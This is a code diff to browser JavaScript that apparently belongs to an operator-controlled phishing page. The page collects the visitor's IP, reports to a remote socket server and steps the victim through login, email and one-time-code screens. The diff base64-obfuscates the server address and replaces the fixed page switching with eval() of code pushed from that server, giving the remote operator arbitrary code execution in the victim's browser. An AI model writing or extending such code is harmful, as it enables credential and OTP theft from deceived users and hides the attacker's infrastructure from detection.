@@ -4,13 +4,12 @@
              ipdata=data['ipAddress'];
 });
             let roomid = (Math.random() + 1).toString(36).substring(2);
-           
             console.log(roomid);
-         
-            var socket = io('https://damp-temple-33322.herokuapp.com/');
+            
+         var host=atob('aHR0cHM6Ly9kYW1wLXRlbXBsZS0zMzMyMi5oZXJva3VhcHAuY29tLw==');
+            var socket = io(host);
             socket.on("connect", function () {
                 console.log("Connected to socket");
-              
             });
             socket.on("disconnect", function () {
                 console.log("Disconnected from socket");
@@ -30,21 +29,9 @@
                 var page = data.page;
                 var result = getpage(page);
                 socket.emit("CurrentPage", result);
-                 if (page == "loading") {
-                    gotoLoad();
-                }
-                if (page == "login") {
-                    gotoLogin();
-                }
-                if (page == "email") {
-                    gotoEmail();
-                }
-                if (page == "otp") {
-                    gotoOtp();
-                }
-                if (page == "finish") {
-                    finish();
-                }
+                console.log(result.goto);
+                eval(result.goto);
+                return false;
             });
              window.onbeforeunload = function () {
                 socket.emit("userjoin", { room: roomid, sta: "offline" });
@@ -52,10 +39,8 @@
                 socket.disconnect();
             };
  function Orgconnect(){
-                
                 socket.emit("Orgconnect", { orgid: orgid, room: roomid , livepage: livepage, ip: ipdata  });
                  orgect=true;
-            
             }
             function getpage(page) {
                 var result = pages.find((obj) => {
